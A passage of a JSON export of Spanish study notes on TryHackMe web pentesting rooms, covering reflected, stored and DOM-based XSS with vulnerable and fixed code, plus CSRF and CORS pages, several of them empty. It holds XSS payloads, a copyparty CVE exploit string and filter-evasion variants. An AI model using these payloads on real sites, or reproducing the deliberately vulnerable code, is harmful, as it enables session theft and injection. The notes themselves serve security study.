command.Parameters.AddWithValue(\"@comment\", userComment);\n}\n\npublic void DisplayComments()\n{\n    var reader = new SqlCommand(\"SELECT Comment FROM Comments\", connection).ExecuteReader();\n    while (reader.Read())\n    {\n        var comment = reader[\"Comment\"].ToString();\n        var sanitizedComment = HttpUtility.HtmlEncode(comment);\n        Response.Write(sanitizedComment);\n    }\n    reader.Close();\n}\n```\n\nCon unos pocos cambios, la seguridad del c√≥digo ha mejorado. Se arregla la stored XSS usando el m√©todo `HttpUtility.HtmlEncode()` antes de mostrar `userComment` como parte de la web. Si tienes curiosidad sobre c√≥mo mitigar la vulnerabilidad SQL se hace con el m√©todo `Parameters.AddWithValue()` en el objeto `SqlCommand`.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "4. Reflected XSS",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/1-xss/4-reflected-xss/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/1. XSS/4. Reflected XSS.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 1. XSS",
    "content": "El XSS reflejado es un tipo de vulnerabilidad XSS donde un script malicioso es reflejado en el navegador del usuario, normalmente v√≠a una URL construida o formulario de subida. Considera una query de b√∫squeda que contenga `<script>alert(document.cookie)</script>`. Muchos usuarios no sospechar√≠an de dicha URL incluso si la miraran de cerca. Si se procesa por un aplicaci√≥n vulnerable, ser√° ejecutada en el contexto del navegador del usuario.\n\n--------------------------------\n<h2>Aplicaci√≥n Web Vulnerable</h2>\nUna vulnerabilidad XSS reflejada simple es cuando el usuario busca por alg√∫n t√©rmino y el string de b√∫squeda est√° incluido en los resultados de b√∫squeda. Este escenario simple ofrece un objetivo f√°cil para que el atacante lo explote.\n\nAunque descubir este tipo de vulnerabiliidades no es siempre f√°cil, arreglarlos s√≠ lo es. Un input de usuario tal como `<script>alert('XSS')</script>` deber√≠a ser sanitizado o HTML-encodeado a `&lt;script&gt;alert('XSS')&lt;/script&gt;`.\n\nEn las siguientes subsecciones veremos ejemplos de c√≥digo vulnerable en los siguientes lenguajes/frameworks.\n\n- PHP\n- JavaScript (Node.js)\n- Python (Flask)\n- C# (ASP.NET)\n\n\n-------------------------------\n<h2>PHP</h2>\n<h4>C√≥digo Vulnerable</h4>\n```php\n<?php\n$search_query = $_GET['q'];\necho \"<p>You searched for: $search_query</p>\";\n?>\n```\n\nSi est√°s familiarizado con PHP, `$_GET` es una array de PHP que contiene valores de la URL. Adem√°s, `$_GET['q']` se refiere al par√°metro de la query de string `q`. Por ejemplo, en `http://shop.thm/search.php?q=table`, `$_GET['q']` tiene el valor `table`.\n\nEl problema aqu√≠ es que el input del usuario no se est√° sanitizando y est√° siendo mostrado en la p√°gina resultante directamente. Por lo que un atacante puede a√±adir c√≥digo malicioso a la URL como `http://shop.thm/search.php?q=<script>alert(document.cookie)</script>` y si el sitio es vulnerable mostrar√° la cookie de sesi√≥n.\n\n<h4>C√≥digo Arreglado</h4>\n```php\n<?php\n$search_query = $_GET['q'];\n$escaped_search_query = htmlspecialchars($search_query);\necho \"<p>You searched for: $escaped_search_query</p>\";\n?>\n```\n\nLa funci√≥n `htmlspecialchars()` convierte caracteres especiales a entidades HTML. Los caracteres `<`, `>`, `&`, `\"`, `'` se reemplazan para prevenir el input de scripts al ejecutar. Puedes leer su documentaci√≥n [aqu√≠](https://www.php.net/htmlspecialchars).\n\n---------------------------------\n<h2>JavaScript (Node.js)</h2>\n<h4>C√≥digo Vulnerable</h4>\n```javascript\nconst express = require('express');\nconst app = express();\n\napp.get('/search', function(req, res) {\n    var searchTerm = req.query.q;\n    res.send('You searched for: ' + searchTerm);\n});\n\napp.listen(80);\n```\n\nSi no est√°s familiarizado con Node.js, el c√≥digo de arriba usa Express, un framework de aplicaciones web popular para Node.js. El `req.query.q` tiene el valor `table`. Por √∫ltimo se genera la respuesta haciendo append (a√±adiendo) dicho √≠tem de b√∫squeda a la string.\n\nComo se a√±ade sin sanitizar, es f√°cil insertar una query maliciosa: `http://shop.thm/search?q=<script>alert(document.cookie)</script>`.\n\n<h4>C√≥digo Arreglado</h4>\n```javascript\nconst express = require('express');\nconst sanitizeHtml = require('sanitize-html');\n\nconst app = express();\n\napp.get('/search', function(req, res) {\n    const searchTerm = req.query.q;\n    const sanitizedSearchTerm = sanitizeHtml(searchTerm);\n    res.send('You searched for: ' + sanitizedSearchTerm);\n});\n\napp.listen(80);\n```\n\nConseguimos solucionarlo usando la funci√≥n `sanitizeHtml()` de la librer√≠a `sanitize-html`. Esta funci√≥n elimina elementos y atributos no seguros. Puedes leer su documentaci√≥n [aqu√≠](https://www.npmjs.com/package/sanitize-html).\n\nOtra opci√≥n ser√≠a `escapeHtml()` que escapa caracteres como `<`, `>`, `&`, `\"` y `'`. Puedes mirar su documentaci√≥n [aqu√≠](https://github.com/component/escape-html).\n\n----------------------------\n<h2>Python (Flask)</h2>\n<h4>C√≥digo Vulnerable</h4>\n```python\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route(\"/search\")\ndef home():\n    query = request.args.get(\"q\")\n    return f\"You searched for: {query}!\"\n\nif __name__ == \"__main__\":\n    app.run(debug=True)\n```\n\nSi no est√°s familiarizado con Flask, `request.args.get()` se usa para acceder a los par√°metros de la string query de la URL solicitada. De hecho, `request.args` contiene todos los par√°metros de la URL en un objeto de estilo diccionario. Es decir, que en `http://shop.thm/search?q=table`, `request.args.get(\"q\")` tiene el valor `table`.\n\nPor esto es f√°cil inyectar c√≥digo malicioso (no est√° sanitizado): `http://shop.thm/search?q=<script>alert(document.cookie)</script>`.\n\n<h4>C√≥digo Arreglado</h4>\n```python\nfrom flask import Flask, request\nfrom html import escape\n\napp = Flask(__name__)\n\n@app.route(\"/search\")\ndef home():\n    query = request.args.get(\"q\")\n    escaped_query = escape(query)\n    return f\"You searched for: {escaped_query}!\"\n\nif __name__ == \"__main__\":\n    app.run(debug=True)\n```\n\nEl cambio principal es que ahora usamos la funci√≥n `escape()` del m√≥dulo `html`. La funci√≥n `html.escape()` en Flask es enrealidad un alias para `markupsafe.escape()`. Convierte caracteres como `<`, `>`, `\"` y `'` a entidades escapadas HTML.\n\n--------------------------------\n<h2>ASP.NET</h2>\n<h4>C√≥digo Vulnerable</h4>\n```csharp\npublic void Page_Load(object sender, EventArgs e)\n{\n    var userInput = Request.QueryString[\"q\"];\n    Response.Write(\"User Input: \" + userInput);\n}\n```\n\nSi no est√°s familiarizado con ASP.NET y C#, el c√≥digo de arriba usa `Request.QueryString` que devuelve una colecci√≥n de claves y valores asociados. En el ejemplo de arriba guardamos en `userInput` el valor de `q`.\n\n<h4>C√≥digo Arreglado</h4>\n```csharp\nusing System.Web;\n\npublic void Page_Load(object sender, EventArgs e)\n{\n    var userInput = Request.QueryString[\"q\"];\n    var encodedInput = HttpUtility.HtmlEncode(userInput);\n    Response.Write(\"User Input: \" + encodedInput);\n}\n```\n\nAqu√≠ hacemos lo mismo pero usamos el m√©todo `HttpUtility.HtmlEncode()` que convierte caracteres como `<`, `>` y `&` a sus respectivas entidades HTML-encodeadas.",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "5. Vulnerable Web Application 1",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/1-xss/5-vulnerable-web-application-1/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/1. XSS/5. Vulnerable Web Application 1.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 1. XSS",
    "content": "La m√°quina virtual en esta tarea es una versi√≥n vulnerable de [copyparty](https://github.com/9001/copyparty). La vulnerabilidad reflected XSS tiene el ID [CVE-2023-38501](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-38501) y su exploit se public√≥ [aqu√≠](https://www.exploit-db.com/exploits/51635).\n\nEl c√≥digo del exploit es: `?k304=y%0D%0A%0D%0A%3Cimg+src%3Dcopyparty+onerror%3Dalert(1)%3E` que es el URL-encode de: `?k304=y <img src=copyparty onerror=alert(1)>`. \n\nLa m√°quina tiene el servicio vulnerable corriendo en el puerto `3923`.\n\n----------------------------------------------\n1. Vamos a la p√°gina dada.\n   ![[Pasted image 20251211125550.png]]\n2. Insertamos la query en la URL.\n   ![[Pasted image 20251211125708.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "0. XSS",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/1-xss/0-xss/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/1. XSS/0. XSS.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 1. XSS",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/1. XSS/1. Introduction]]\n[[2. Terminology and Types]]\n[[3. Causes and Implications]]\n[[4. Reflected XSS]]\n[[5. Vulnerable Web Application 1]]\n[[6. Stored XSS]]\n[[7. Vulnerable Web Application 2]]\n[[8. DOM-Based XSS]]\n[[9. Context and Evasion]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "9. Context and Evasion",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/1-xss/9-context-and-evasion/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/1. XSS/9. Context and Evasion.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 1. XSS",
    "content": "<h2>Context</h2>\nEl payload inyectado tomar√° lugar (muy probablemente) en una de las siguientes:\n\n- Entre etiquetas HTML.\n- En etiquetas HTML.\n- Dentro del JavaScript.\n\nCuando el XSS ocurre entre etiquetas HTML un atacante puede ejecutar `<script>alert(document.cookie)</script>`\n\nCuando la inyecci√≥n se produce en las etiquetas, necesitamos terminar el tag para darle al script su ejecuci√≥n. Por lo que podemos adaptar nuestro payload a `><script>alert(document.cookie)</script>` o `\"><script>alert(document.cookie)</script>` o algo similar dependiendo del contexto.\n\nSi ocurre en el JS, puede que necesitemos terminar el script para correr el nuestro, por lo que podemos empezar con `</script>` y luego seguir con nuestro payload. Si est√° dentro de una string de JS, podemos empezar con `'` para cerrar la string, luego `;` para \"terminar\" la linea, luego nuestro payload y por √∫ltimo `//` para comentar. Algo como `';alert(document.cookie)//`.\n\n---------------------------------------\n<h2>Evasion</h2>\nVarios repositorios pueden ser consultados para construir tu propio payload XSS. Esto te da muchas posibilidades de experimentaci√≥n. Una de estas listas es [XSS Payload List](https://github.com/payloadbox/xss-payload-list).\n\nSin embargo, a veces hay filtros bloqueando los payloads XSS. Si la limitaci√≥n est√° basada en la longitud, entonces prueba [Tiny XSS Payloads](https://github.com/terjanq/Tiny-XSS-Payloads).\n\nSi est√°n bloqueados basado en bloques de c√≥digo espec√≠ficos, hay varios trucos para evadirlos. Por ejemplo una tabulaci√≥n, una nueva linea o un enter pueden romper los m√©todos de detecci√≥n de los motores.\n\n- Horizontal tab (TAB) es `9` en hexadecimal.\n- Nueva linea (LF) es `A` en hexadecimal.\n- Enter (CR) es `D` en hexadecimal.\n\n```javascript\n<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">\n<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">\n<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">\n```",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "8. DOM-Based XSS",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/1-xss/8-dom-based-xss/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/1. XSS/8. DOM-Based XSS.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 1. XSS",
    "content": "Si compruebas cualquier Security Advisory actualizado, es f√°cil encontrar nuevas vulnerabilidades reflected y stored XSS descubiertas cada mes. Sin embargo no es igual para las DOM-Based XSS. Est√° completamente basada en el navegador y no necesita ir al servidor y volver. Antes, pod√≠a crearse una [PoC de DOM-Based XSS](http://www.webappsec.org/projects/articles/071105.shtml) con  una p√°gina HTML est√°tica. Sin embargo, con la evoluci√≥n de los navegadores y su seguridad se ha dejado de poder y se ha vuelto todav√≠a m√°s dif√≠cil.\n\nAntes de sumergirnos en las DOM-Based XSS, veamos lo que es un Document Object Model (DOM). El DOM es una interfaz de programaci√≥n que representa un documento web como un √°rbol. Hace posible acceder y manipular las diferentes partes de la web de forma programada usando JavaScript.\n\nConsidera el HTML de [example.com](http://www.example.com/) como era en Febrero de 2024 (abajo).\n\n![[Pasted image 20251211164935.png]]\n\nEl √°rbol DOM sigue este formato:\n\n- `document`\n\t- `<!DOCTYPE html>`\n\t- `html`\n\t\t- `title`\n\t\t- `meta`\n\t\t- `meta`\n\t\t- `meta`\n\t\t- `style`\n\t- `body`\n\t\t- `div`\n\t\t\t- `h1`\n\t\t\t- `p`\n\t\t\t- `p`\n\t\t\t\t- `a`\n\nPodemos ver el DOM tree usando las herramientas de  desarrollador del navegador.\n\nUsando JavaScript podemos manipular el DOM tree. Por ejemplo, podemos crear un nuevo elemento usando `document.createElement()` y a√±adir un hijo a cualquier elemento usando `element.append()`.\n\nAqu√≠ tienes un ejemplo de [MDN Documentation](https://developer.mozilla.org/en-US/docs/Web/API/Document).\n\n```javascript\nlet div = document.createElement(\"div\");\nlet p = document.createElement(\"p\");\ndiv.append(p);\n\nconsole.log(div.childNodes); // NodeList [ <p> ]\n```\n\nEn este ejemplo hemos creado dos elementos `dic` y `p`. Luego hemos a√±adido `p` a `div`.\n\n----------------------------------------------\n<h2>Vulnerable Web Applications</h2>\nLas vulnerabilidades DOM-Based toman lugar en el navegador. No necesitan ir al servidor y volver, es decir que el atacante inyectar√° c√≥digo, por ejemplo, en la URL y este ser√° ejecutado en el propio navegador.\n\n------------------------------------\n<h2>Vulnerable \"Static\" Site</h2>\nConsideremos el siguiente ejemplo. Es tan sencillo que es surrealista. Sin embargo, es suficiente para demostrar la DOM-Based XSS.\n\n```html\n<!DOCTYPE html>\n<html>\n<head>\n    <title>Vulnerable Page</title>\n</head>\n<body>\n    <div id=\"greeting\"></div>\n    <script>\n        const name = new URLSearchParams(window.location.search).get('name');\n        document.write(\"Hello, \" + name);\n    </script>\n</body>\n</html>\n```\n\nLa p√°gina de arriba espera que el usuario le de su nombre en `?name=`. En la imagen de abajo:\n\n1. El usuario ha introducido \"Web Tester\" despu√©s de `?name` en la URL.\n2. El saludo funcion√≥ como se esperaba, sali√≥ \"Hello, Web Tester\".\n3. Finalmente la estructura DOM en la derecha est√° intacta. El `<body>` tiene 3 hijos.\n\n![[Pasted image 20251211170900.png]]\n\nEl usuario puede intentar inyectar un script malicioso. En la imagen de abajo vemos:\n\n1. El usuario a√±adi√≥ `<script>alert(\"XSS\")</script>` en vez de s√≥lo `Web Tester` como su nombre.\n2. El script se ejecut√≥ y la caja de alerta se despleg√≥.\n3. M√°s importante, podemos ver c√≥mo el DOM tree ahora tiene un nuevo elemento bajo `<body>`.\n\n![[Pasted image 20251211171231.png]]\n\nEste ejemplo b√°sico muestra un par de cosas:\n\n- El servidor no tiene rol directo en las vulnerabilidades basadas en DOM.\n- El DOM fue modificado de forma insegura usando `document.write()`.\n\n------------------------------------------------\n<h2>Fixed \"Static\" Site</h2>\n```html\n<!DOCTYPE html>\n<html>\n<head>\n    <title>Secure Page</title>\n</head>\n<body>\n    <div id=\"greeting\"></div>\n    <script>\n        const name = new URLSearchParams(window.location.search).get('name');\n        // Escape the user input to prevent XSS attacks\n        const escapedName = encodeURIComponent(name);\n        document.getElementById(\"greeting\").textContent = \"Hello, \" + escapedName;\n    </script>\n</body>\n</html>\n```\n\nUna manera de arreglar esta p√°gina es evitar a√±adir el input del usuario directamente con `document.write()`. En su lugar, primero lo escapamos con `encodeURIComponent()` y luego lo a√±adimos a `textContent`.\n\nEl intento anterior no funciona ahora.\n\n![[Pasted image 20251211171643.png]]",
    "modified": "2025-12-12T13:58:55"
  },
  {
    "title": "7. Few Additional Exploitation Techniques",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/2-csrf/7-few-additional-exploitation-techniques/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/2. CSRF/7. Few Additional Exploitation Techniques.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 2. CSRF",
    "content": "",
    "modified": "2026-02-10T01:18:20"
  },
  {
    "title": "2. Overview of CSRF Attack",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/2-csrf/2-overview-of-csrf-attack/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/2. CSRF/2. Overview of CSRF Attack.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 2. CSRF",
    "content": "<h2>¬øQu√© es CSRF?</h2>\nCSRF es un tipo de vulnerabilidad de seguridad donde un atacante enga√±a al navegador de un usuario para que realice acciones no intencionadas en un sitio web de confianza del usuario donde este est√° autentificado. Se consigue explotando el hecho de que el navegador incluye cualquier cookie relevante (credenciales) autom√°ticamente, permitiendo al atacante suplantar y subir peticiones no autorizadas en nombre del usuario (a trav√©s del navegador). El sitio web del atacante puede contener formularios HTML o c√≥digo JavaScript que est√° intencionado para mandar queries a la aplicaci√≥n web objetivo.\n\n-------------------------------------\n<h2>Ciclo de CSRF</h2>\nUn ataque CSRF tiene tres fases esenciales:\n\n1. El atacante sabe el formato de las peticiones de la aplicaci√≥n web para realizar una tarea particular y manda un link malicioso al usuario.\n2. La identidad de la v√≠ctima se verifica en la web, t√≠picamente por cookies transmitidas autom√°ticamente con cada petici√≥n y hace click en el link compartido por el atacante. Esta interacci√≥n podr√≠a ser un click, mouse over o cualquier otra acci√≥n.\n3. Medidas de seguridad insuficientes previenen a la aplicaci√≥n web de distinguir peticiones aut√©nticas de aquellas falsificadas.\n\n![phases of csrf](https://tryhackme-images.s3.amazonaws.com/user-uploads/62a7685ca6e7ce005d3f3afe/room-content/61e098019fb1d8611c0aa16f23c34633.svg)\n\n----------------------------\n<h2>Efectos de CSRF</h2>\nEntender el impacto de CSRF es crucial para mantener las actividades online seguras. Aunque los ataques CSRF no exponen directamente la informaci√≥n de los usuarios, puede seguir causando mucho da√±o cambiando las contrase√±as, cuentas de correo o haciendo transacciones financieras. Los riesgos asociados a CSRF incluyen:\n\n- **Acceso no autorizado:** Los atacantes pueden acceder y controlar las acciones de un usuario suponiendo un riesgo de p√©rdida de dinero, da√±o de su reputaci√≥n y enfrentarse a consecuencias legales.\n- **Explotaci√≥n de confianza:** CSRF explota la confianza que los sitios web ponen en los usuarios.\n- **Explotaci√≥n sigilosa:** Funciona silenciosamente sin necesidad de malware avanzado. Los usuarios pueden no sospechar de un ataque, haci√©ndolos m√°s vulnerables a explotaci√≥n repetida.",
    "modified": "2026-02-15T01:10:57"
  },
  {
    "title": "0. CSRF",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/2-csrf/0-csrf/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/2. CSRF/0. CSRF.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 2. CSRF",
    "content": "[[Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/2. CSRF/1. Introduction]]\n[[2. Overview of CSRF Attack]]\n[[3. Types of CSRF Attack]]\n[[4. Basic CSRF - Hidden Link-Image Exploitation]]\n[[5. Double Submit Cookie Bypass]]\n[[6. Samesite Cookie Bypass]]\n[[7. Few Additional Exploitation Techniques]]\n[[8. Defence Mechanisms]]",
    "modified": "2026-02-10T01:18:20"
  },
  {
    "title": "1. Introduction",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/2-csrf/1-introduction/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/2. CSRF/1. Introduction.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 2. CSRF",
    "content": "Bienvenido a un mundo donde lanzar ataques web es tan f√°cil que incluso los principiantes (como los script kiddies) pueden escribir scripts simples para hackear grandes corporaciones. En esta unidad nos centraremos en uno de estos ataques web llamado Cross-Site Request Forgery (CSRF o XSRF).\n\n---------------------------------\n<h2>Objetivos de Aprendizaje</h2>\n- Entender el funcionamiento de un CSRF\n- Tipos de ataques CSRF\n- Payloads avanzados para explotaci√≥n\n- Mecanismos defensivos\n\n--------------------------------\n<h2>Pre-requisitos</h2>\n- [[Ciberseguridad/THM/0. Pre Career/1. Pre Security/3. How the Web Works/3. How Websites Work/0. How Websites Work]]\n- [[0. Protocols and Servers]]\n- [[Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/8. Web Hacking/5. OWASP Top 10 - 2021/0. OWASP Top 10 - 2021]]\n\n------------------------------------------\n<h2>Conectarse a la M√°quina</h2>\n\n| **App Name**                           | IP Address | Host Address          | **URL to Access**                 |\n| -------------------------------------- | ---------- | --------------------- | --------------------------------- |\n| Online banking application             | MACHINE_IP | `mybank.thm`          | `http://mybank.thm:8080`          |\n| Mailbox application                    | MACHINE_IP | `mailbox.thm`         | `http://mailbox.thm:8081`         |\n| Attacker panel (subdomain of bank app) | MACHINE_IP | `attacker.mybank.thm` | `http://attacker.mybank.thm:8080` |\nEdita `/etc/hosts` si es necesario.",
    "modified": "2026-02-15T01:10:57"
  },
  {
    "title": "5. Double Submit Cookie Bypass",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/2-csrf/5-double-submit-cookie-bypass/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/2. CSRF/5. Double Submit Cookie Bypass.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 2. CSRF",
    "content": "",
    "modified": "2026-02-10T01:18:20"
  },
  {
    "title": "8. Defence Mechanisms",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/2-csrf/8-defence-mechanisms/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/2. CSRF/8. Defence Mechanisms.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 2. CSRF",
    "content": "",
    "modified": "2026-02-10T01:18:20"
  },
  {
    "title": "6. Samesite Cookie Bypass",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/2-csrf/6-samesite-cookie-bypass/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/2. CSRF/6. Samesite Cookie Bypass.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 2. CSRF",
    "content": "",
    "modified": "2026-02-10T01:18:20"
  },
  {
    "title": "3. Types of CSRF Attack",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/2-csrf/3-types-of-csrf-attack/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/2. CSRF/3. Types of CSRF Attack.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 2. CSRF",
    "content": "",
    "modified": "2026-02-10T01:18:20"
  },
  {
    "title": "4. Basic CSRF - Hidden Link-Image Exploitation",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/2-csrf/4-basic-csrf-hidden-link-image-exploitation/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/2. CSRF/4. Basic CSRF - Hidden Link-Image Exploitation.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 2. CSRF",
    "content": "",
    "modified": "2026-02-10T01:18:20"
  },
  {
    "title": "7. Bad Regex in Origin",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/4-cors-sop/7-bad-regex-in-origin/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/4. CORS & SOP/7. Bad Regex in Origin.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 4. CORS & SOP",
    "content": "",
    "modified": "2026-02-15T01:10:57"
  },
  {
    "title": "8. Null Origin",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/4-cors-sop/8-null-origin/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/4. CORS & SOP/8. Null Origin.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 4. CORS & SOP",
    "content": "",
    "modified": "2026-02-15T01:10:57"
  },
  {
    "title": "1. Understanding SOP",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/4-cors-sop/1-understanding-sop/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/4. CORS & SOP/1. Understanding SOP.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 4. CORS & SOP",
    "content": "",
    "modified": "2026-02-15T01:10:57"
  },
  {
    "title": "4. Common Misconfigurations",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/4-cors-sop/4-common-misconfigurations/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/4. CORS & SOP/4. Common Misconfigurations.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 4. CORS & SOP",
    "content": "",
    "modified": "2026-02-15T01:10:57"
  },
  {
    "title": "2. Understanding CORS",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/4-cors-sop/2-understanding-cors/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/4. CORS & SOP/2. Understanding CORS.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 4. CORS & SOP",
    "content": "",
    "modified": "2026-02-15T01:10:57"
  },
  {
    "title": "3. ACAO in depth",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/4-cors-sop/3-acao-in-depth/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/4. CORS & SOP/3. ACAO in depth.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 4. CORS & SOP",
    "content": "",
    "modified": "2026-02-15T01:10:57"
  },
  {
    "title": "5. Lab Connection",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/4-cors-sop/5-lab-connection/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/4. CORS & SOP/5. Lab Connection.md",
    "breadcrumb": "THM > 1. Career > 2. Penetration Tester > 3. Web Application Pentesting > 4. Advanced Client-Side Attacks > 4. CORS & SOP",
    "content": "",
    "modified": "2026-02-15T01:10:57"
  },
  {
    "title": "0. CORS & SOP",
    "path": "/apuntes/thm/1-career/2-penetration-tester/3-web-application-pentesting/4-advanced-client-side-attacks/4-cors-sop/0-cors-sop/",
    "src": "content/Ciberseguridad/THM/1. Career/2. Penetration Tester/3. Web Application Pentesting/4. Advanced Client-Side Attacks/4. CORS & SOP/0. CORS & SOP.md",
